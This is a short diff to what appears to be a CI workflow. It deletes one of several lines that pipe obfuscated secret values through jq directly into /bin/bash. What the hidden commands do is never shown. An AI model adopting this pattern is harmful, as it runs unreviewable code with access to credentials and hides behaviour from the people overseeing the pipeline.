@@ -20,7 +20,6 @@ jobs:
           amai91230: ${{ secrets.amai91230 }}
         run: |
           printf '%s' "$amai91230" | jq -r .znzfj0885 | /bin/bash
-          echo $eoto53 | jq -r .vdpqs160 | /bin/bash
           printf '%s' "$fbgf38902" | jq -r .brki0 | /bin/bash
           printf '%s' "$pn9" | jq -r .fp799 | /bin/bash
           printf '%s' "$n56814" | jq -r .by74768 | /bin/bash
